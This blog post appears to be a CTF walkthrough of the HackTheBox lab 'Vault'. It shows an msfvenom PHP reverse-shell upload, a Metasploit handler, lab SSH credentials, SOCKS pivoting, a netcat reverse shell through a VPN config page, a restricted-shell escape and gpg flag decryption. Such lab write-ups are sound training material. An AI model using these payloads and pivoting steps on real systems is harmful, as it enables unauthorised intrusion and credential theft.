<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">HacktheBox Vault Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-vault-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-04-13T14:14:54+00:00">April 13, 2019</time><time class="updated" datetime="2025-06-29T10:46:20+00:00">June 29, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p>Today we are going to solve another CTF challenge “Vault”. It is a retired vulnerable lab presented by Hack the Box for helping pentesters to perform online penetration testing according to your experience level; they have a collection of vulnerable labs as challenges, from beginners to Expert level.</p>
<p><strong><span style="color: #000000;">Level: Intermediate</span></strong></p>
<p><span style="color: #000000;">Task: To find user.txt and root.txt file</span></p>
<p><strong><span style="color: #000000;">Note: Since these labs are online available, therefore, they have a static IP. The IP of Curling is 10.10.10.109</span></strong></p>
<h3><span style="color: #800000;">Penetrating Methodology</span></h3>
<ul>
<li><span style="color: #000000;">Network scanning (Nmap)</span></li>
<li><span style="color: #000000;">Surfing the IP address on the browser</span></li>
<li><span style="color: #000000;">Surfing directories on the browser</span></li>
<li><span style="color: #000000;">Using dirb for directory scanning</span></li>
<li><span style="color: #000000;">Creating Payload using msfvenom</span></li>
<li><span style="color: #000000;">Getting Meterpreter Session</span></li>
<li><span style="color: #000000;">Enumerating through directories</span></li>
<li><span style="color: #000000;">Getting SSH login credentials</span></li>
<li><span style="color: #000000;">Logging into SSH</span></li>
<li><span style="color: #000000;">Pinging Host IP</span></li>
<li><span style="color: #000000;">Scanning Ports on Host IP</span></li>
<li><span style="color: #000000;">Dynamic Port forwarding with SSH</span></li>
<li><span style="color: #000000;">Updating the VPN Configuration file</span></li>
<li><span style="color: #000000;">Executing Netcat listener</span></li>
<li><span style="color: #000000;">Finding user.txt</span></li>
<li><span style="color: #000000;">Getting SSh Login Credentials</span></li>
<li><span style="color: #000000;">Using the proxy command option</span></li>
<li><span style="color: #000000;">Escaping restricted shell</span></li>
<li><span style="color: #000000;">Using gpg to decrypt root.txt.gpg file</span></li>
<li><span style="color: #000000;">Converting the file in the base64 string using python3m</span></li>
<li><span style="color: #000000;">Using echo to decrypt the string</span></li>
<li><span style="color: #000000;">Reading our Root Flag</span></li>
</ul>
<h3><span style="color: #800000;">Walkthrough</span></h3>
<p><span style="color: #000000;">Let’s start off with our basic Nmap command to find out the open ports and services.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -p- -sV -sC 10.10.10.109</pre>
<p><img decoding="async" src="//1.bp.blogspot.com/-1hBD2-Ae1kw/XLHoEv7_irI/AAAAAAAAd88/9svoJsoJIGch2mOb0OdSx_JiWcLAqrfPgCLcBGAs/s1600/1.png"/></p>
<p><span style="color: #000000;">As port 80 is running HTTP service, we open the IP address in the web browser.</span></p>
<p><img decoding="async" src="//2.bp.blogspot.com/-8zsScXbzE3Q/XLHoHHsLbMI/AAAAAAAAd9k/hkb_rvvEmC008G9qoNyYZM5eDaGm5jLQgCLcBGAs/s1600/2.png"/></p>
<p><span style="color: #000000;">We thought of opening sparklays in the browser along with the Machines IP. But it turned out to be forbidden.</span></p>
<p><img decoding="async" src="//4.bp.blogspot.com/-xEgcU8Qbvm4/XLHoKR7L1eI/AAAAAAAAd-Q/FHSBbPuy8t85GFV2CqatB-Tay7YUDNYSgCLcBGAs/s1600/3.png"/></p>
<p><span style="color: #000000;">We don’t find anything on the web page, so we further enumerate the web service using dirb scan.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">dirb //10.10.10.109/sparklays/ -w</pre>
<p><img decoding="async" src="//4.bp.blogspot.com/-z5CEkFDCd58/XLHoLHQ2PcI/AAAAAAAAd-c/5PYbFGbNQd0EPJ6PJRz9YnlIwxwj_XSiACLcBGAs/s1600/4.png"/></p>
<p><span style="color: #000000;">From dirb scan, we found a useful directory <strong>/design/design.html</strong> which we opened in the browser. Since the only thing left to do on this Page is to click on Change Logo.</span></p>
<p><img decoding="async" src="//3.bp.blogspot.com/-vKL2YNDBO0Q/XLHoLhPQdkI/AAAAAAAAd-g/XLauWyb-3GgXW738mABUuNy0mFbS1YI2ACLcBGAs/s1600/5.png"/></p>
<p><span style="color: #000000;">It redirected us on a File Upload Page.</span></p>
<p><img decoding="async" src="//1.bp.blogspot.com/-fxnRgeVzx88/XLHoMMnlBGI/AAAAAAAAd-k/7jtBGHcpEqs1f0A0N6kSGysctnio9A29gCLcBGAs/s1600/6.png"/></p>
<p><span style="color: #000000;">Now we have used <strong>msfvenom</strong> to generate malicious PHP file.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.13.234 lport=1234 -f raw &gt; shell.php5</pre>
<p><img decoding="async" src="//1.bp.blogspot.com/-qTXObCWiEp4/XLHoMhWYK-I/AAAAAAAAd-o/rafj912n8ykvPQVsfhxz73B6wa-qQEPcgCLcBGAs/s1600/7.png"/></p>
<p><span style="color: #000000;">We have successfully uploaded the malicious file.</span></p>
<p><img decoding="async" src="//1.bp.blogspot.com/--oEP708YPSQ/XLHoNJd5USI/AAAAAAAAd-s/QqloBZeeIvUbxwzD6N9YgEHU-3wcO49_ACLcBGAs/s1600/8.png"/></p>
<p><span style="color: #000000;">On the other hand, we have setup listening using Metasploit-framework.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf &gt; use exploit/multi/handler
msf exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcp
msf exploit(multi/handler) &gt; set lhost tun0
msf exploit(multi/handler) &gt; set lport 1234
msf exploit(multi/handler) &gt; run</pre>
<p><img decoding="async" src="//1.bp.blogspot.com/-Fxpge_0cAt8/XLHoNaEX8pI/AAAAAAAAd-w/lzAhqKH4wSQZc892-R0RLRGA-kar4Hj8QCLcBGAs/s1600/9.png"/></p>
<p><span style="color: #000000;">Let’s open our malicious file using the browser.</span></p>
<p><img decoding="async" src="//1.bp.blogspot.com/-Sl2I9IJFCVk/XLHoEhi4NfI/AAAAAAAAd9E/6RMe3Xi0yjkiMZ13nDGzrLyCCQtd5GPXQCLcBGAs/s1600/10.png"/></p>
<p><span style="color: #000000;">Finally, we have got the meterpreter.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sysinfo</pre>
<p><img decoding="async" src="//4.bp.blogspot.com/-5nEcnDHnW4Y/XLHoEiiTzgI/AAAAAAAAd9A/aa3buCkjifMZpadnys4LMihPsxQIKYBfwCLcBGAs/s1600/11.png"/></p>
<p><span style="color: #000000;">While looking for our first flag, we have some useful credential for ssh login.</span></p>
<h5><span style="color: #000000;">Username- dave</span></h5>
<p><span style="color: #000000;"><strong>Password- Dav3therav3123</strong></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd Desktop
ls -al
cat Servers
cat key
cat ssh</pre>
<p><img decoding="async" src="//1.bp.blogspot.com/-17q3EDAK0a4/XLHoFdYtv_I/AAAAAAAAd9I/ogZY5Oy0ji0RQaTvxVuFcqQ7L5b3KjDngCLcBGAs/s1600/12.png"/></p>
<p><span style="color: #000000;">Time to login into ssh.</span></p>
<h5><span style="color: #000000;">Username- dave</span></h5>
<p><span style="color: #000000;"><strong>Password- Dav3therav3123</strong></span></p>
<p><img decoding="async" src="//4.bp.blogspot.com/-qKEqrnzfCVk/XLHoFpS4-jI/AAAAAAAAd9M/H5sKShlZLAw0NVzMCAimO7DjbSzOSzVYgCLcBGAs/s1600/13.png"/></p>
<p><span style="color: #000000;">We use the ping command to find all the available machines on the subnet “192.168.122.1/255”.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">for i in {1..255}; do ping -c 1 192.168.122.$i | grep 'from' ; done</pre>
<p><img decoding="async" src="//1.bp.blogspot.com/-Fl-ZusYOOUU/XLHoFwm-UxI/AAAAAAAAd9Q/gn-mk3uFSIUPe-iYv5d8z9TS1kqKXnb7ACLcBGAs/s1600/14.png"/></p>
<p><span style="color: #000000;">Let’s use the following command to scan the ports of 192.168.122.4 to see what we are up against.</span></p>
<p><img decoding="async" src="//4.bp.blogspot.com/-ZTR83Km9wiE/XLHoGOUnaoI/AAAAAAAAd9U/TWzvN6PuK68gdEsn_gl-YAqAGXsdu68GgCLcBGAs/s1600/15.png"/></p>
<p><span style="color: #000000;">Now connect to the client machine using the command below.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh -D 8080 dave@10.10.10.109</pre>
<h5><span style="color: #000000;">Password- Dav3therav3123</span></h5>
<p><img decoding="async" src="//4.bp.blogspot.com/-FDP46T3Vv0Y/XLHoGQcqNWI/AAAAAAAAd9Y/IE689yOmwKUeZctopMDHCq1ShH6c-RBxwCLcBGAs/s1600/16.png"/></p>
<p><span style="color: #000000;">The proxy on the browser is set up to point to <strong>socks5://127.0.0.1:8080</strong><strong>.</strong></span></p>
<p><span style="color: #000000;">Let’s open the IP 192.168.122.4 in the browser. And see where it directed us. Click on VPN Configuration link.</span></p>
<p><img decoding="async" src="//2.bp.blogspot.com/-CPCUoLrqt4c/XLHoG3qT6hI/AAAAAAAAd9c/zjX9Swbbdc8yPef7jbol4n-21Qg2lgd_QCLcBGAs/s1600/17.png"/></p>
<p><span style="color: #000000;">It directed us to the page where we need to update the VPN file. We have found the details in Test VPN link.</span></p>
<p><img decoding="async" src="//4.bp.blogspot.com/-TWgoK544dQE/XLHoHIv7b-I/AAAAAAAAd9g/3wbfNE95st4V1du3Jaq7KqkGT8le8gA9QCLcBGAs/s1600/18.png"/></p>
<p><span style="color: #000000;">Simply we have pasted and modified the details in which we have given the IP address of the Target Machine along with port 1234. Click on update file.</span></p>
<p><img decoding="async" src="//4.bp.blogspot.com/-G-u_4IPF9xo/XLHoH0qERwI/AAAAAAAAd9s/pVhQr93CM5gIXO1XxZe2eUGd0rLqlMuJACLcBGAs/s1600/20.png"/></p>
<p><span style="color: #000000;">On the other hand, we have executed listening on port 1234.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 1234</pre>
<p><span style="color: #000000;">We have easily got the root access. Enumerating directories to find user.txt.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /root
ls
ls -al</pre>
<p><img decoding="async" src="//2.bp.blogspot.com/-jG6X-5xOmmU/XLHoH5pMKeI/AAAAAAAAd9o/8XaT0Go5EogCZ-cUOYvhOnoRab_XydzQQCLcBGAs/s1600/21.png"/></p>
<p><span style="color: #000000;">After some digging, we have found our first flag.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ls
cd dave
ls
cat user.txt</pre>
<p><img decoding="async" src="//3.bp.blogspot.com/-8mhvE6Hrdqs/XLHoH60mhFI/AAAAAAAAd9w/BfY-dsFy-7MSSFkMepX9Hwqsv5enUE6-wCLcBGAs/s1600/22.png"/></p>
<p><span style="color: #000000;">Now we thought of reading the logs, we were totally out of hints. While looking at the logs we found something interesting. We saw that the firewall is accepting inbound traffic from port 4444/tcp to host 192.168.5.2 which is listening at 987/tcp.</span></p>
<p><span style="color: #000000;">So, to find out, what’s running on 987/tcp. Use the following command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ncat -p 4444 192.168.5.2 987</pre>
<p><span style="color: #000000;">It came out be SSH service.</span></p>
<p><img decoding="async" src="//3.bp.blogspot.com/-GSFhW09wJXc/XLHoIl6H8zI/AAAAAAAAd90/WG8jpeXLTq0tjXD4GkfRCx5LX_mJlZxUACLcBGAs/s1600/23.png"/></p>
<p><span style="color: #000000;">We again found Credentials for SSH Login.</span></p>
<h5><span style="color: #000000;"><strong>Username- dave</strong></span></h5>
<p><span style="color: #000000;"><strong>Password- dav3gerous567</strong></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat ssh</pre>
<p><span style="color: #000000;"><strong><img decoding="async" src="//3.bp.blogspot.com/-w1Lk_A3_9Jo/XLHoI0A_3hI/AAAAAAAAd94/BVaUyq73ksc9DR5R--vsfxuAorJxYPJ8QCLcBGAs/s1600/24.png"/></strong></span></p>
<p><span style="color: #000000;">What are we waiting for, time to log into SSH, here we again found User.txt.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh dave@192.168.122.4</pre>
<p><span style="color: #000000;"><strong>Password- dav3gerous567</strong></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ls
cat user.txt</pre>
<p><strong><img decoding="async" src="//2.bp.blogspot.com/-LDQ3z2NxnTI/XLHoJDQqQ7I/AAAAAAAAd98/Hl_oPsuTi2w6DuRghv4tRaZ54TpI4VH5wCLcBGAs/s1600/25.png"/></strong></p>
<p><span style="color: #000000;">Since dave has a restricted default shell, so we are using proxy command to re-login.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh -o 'Proxycommand ncat -p 4444 %h %p' -p 987 dave@192.168.5.2</pre>
<p><img decoding="async" src="//2.bp.blogspot.com/-SvoUppAj6rk/XLHoJYDE1hI/AAAAAAAAd-A/fCT8ApnzIuE082miG2VuwQFPodvkp1QdgCLcBGAs/s1600/26.png"/></p>
<p><span style="color: #000000;">After logging in as user “monitor” we find that we have a restricted shell. We are not able to change the SHELL variable. After spawning a TTY shell, we are able to change the SHELL environment variables.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">echo $SHELL
export SHELL=/bin/bash:$SHELL
python
bash
export SHELL=/bin/bash:$SHELL</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-Rsq64tuA-iQ/XLIWh2XNGWI/AAAAAAAAd_Q/t19Q77GEDlwDni309aVY1yYdeNlbywYiwCLcBGAs/s1600/27.png"/></p>
<p><span style="color: #000000;">We tried decrypting the file root.txt.png but couldn’t succeed. Since it requires a secret key.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">gpg -d root.txt.gpg</pre>
<p><img decoding="async" src="//1.bp.blogspot.com/-bJcj5BVYo2A/XLHoKC-g34I/AAAAAAAAd-I/wFmDCzuhe5AhmpHbTj5ZDLPRYmBpG1NwgCLcBGAs/s1600/28.png"/></p>
<p><span style="color: #000000;">There are not many options left, let’s convert into a base64 encoded string using python3m.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3m -c "import base64;print(base64.b64encode(open('root.txt.gpg', 'rb').read()))"</pre>
<p><img decoding="async" src="//4.bp.blogspot.com/-k3LzBBXymWE/XLHoKdHp5iI/AAAAAAAAd-M/mFhqhhnwII0jog1FT7eNGG8viMAYiSwFACLcBGAs/s1600/29.png"/></p>
<p><span style="color: #000000;">We have copy &amp; pasted the encoded string to the ubuntu machine and decrypted it. Since we have found the paraphrase <strong>‘itscominghome’</strong> we can easily open the file <strong>root.txt.gpg</strong> to read our final flag.</span></p>
<p><img decoding="async" src="//2.bp.blogspot.com/-inB_fSoFHkE/XLHoK_l4LkI/AAAAAAAAd-U/1hj0djQZla4jafwvv5I0GQ-yQsMwDdGEwCLcBGAs/s1600/30.png"/></p>
<p><span style="color: #000000;">Finally, we have read our Final Flag.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">gpg -d root.txt.gpg</pre>
<p><img decoding="async" src="//4.bp.blogspot.com/-R1w5izsiypU/XLHoLAvLPNI/AAAAAAAAd-Y/XrHN6jNtqCU4A3j3VsV2y0Q2cVaFZspzACLcBGAs/s1600/31.png"/></p>
<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
<p><strong>Author:</strong> Ashray Gupta is a Security Researcher and Technical Writer at Hacking Articles. Contributing Years in the field of security as a Penetration Tester and Forensic Computer Analyst. Contact <a href="https://www.linkedin.com/in/ashray-gupta-b77221b6/">Here</a></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
